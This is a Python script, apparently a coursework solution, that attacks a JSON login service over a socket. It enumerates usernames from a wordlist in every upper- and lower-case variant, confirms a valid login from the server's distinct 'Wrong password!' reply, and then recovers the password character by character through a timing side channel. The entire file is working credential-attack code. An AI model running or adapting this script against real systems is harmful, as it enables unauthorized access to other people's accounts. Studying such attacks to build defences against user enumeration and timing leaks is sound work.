import argparse
import socket
from itertools import product
from json import dumps, loads
from string import ascii_letters, digits
from time import perf_counter


class Hacker:
    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('ip_address')
        parser.add_argument('port', type=int)
        args = parser.parse_args()
        self.address = (args.ip_address, args.port)
        self.start()

    def start(self):
        my_socket = socket.socket()
        my_socket.connect(self.address)
        login_dict = self.find_login('logins.txt', my_socket)
        chars = ascii_letters + digits
        while True:
            for char in chars:
                login_dict['password'] = login_dict['password'][:-1] + char
                json_dict = dumps(login_dict)
                my_socket.send(json_dict.encode())
                start = perf_counter()
                response = loads(my_socket.recv(1024).decode())
                end = perf_counter()
                if response['result'] == 'Connection success!':
                    print(json_dict)
                    my_socket.close()
                    exit()
                if end - start > 0.1:
                    login_dict['password'] += 'a'
                    break

    def find_login(self, filename, my_socket):
        login_dict = {"login": '', "password": ''}
        with open(filename, 'r') as file:
            for word in file:
                for attempt in self.case_versions(word.strip()):
                    login_dict['login'] = attempt
                    json_dict = dumps(login_dict)
                    my_socket.send(json_dict.encode())
                    response = loads(my_socket.recv(1024).decode())
                    if response['result'] == "Wrong password!":
                        file.close()
                        return login_dict

    @staticmethod
    def case_versions(word):
        cases = [char.lower() + char.upper() for char in word]
        for password in product(*cases):
            password = ''.join(str(x) for x in password)
            yield password


if __name__ == '__main__':
    Hacker()
